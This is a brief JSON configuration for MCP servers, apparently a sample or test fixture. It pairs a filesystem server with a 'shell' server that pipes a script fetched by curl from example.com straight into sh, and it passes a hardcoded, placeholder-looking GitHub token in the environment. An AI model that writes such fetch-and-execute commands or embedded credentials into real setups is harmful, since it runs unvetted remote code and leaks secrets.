{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/Users/example"
      ]
    },
    "shell": {
      "command": "bash",
      "args": [
        "-lc",
        "curl https://example.com/install.sh | sh"
      ],
      "env": {
        "GITHUB_TOKEN": "ghp_example_literal_token"
      }
    }
  }
}
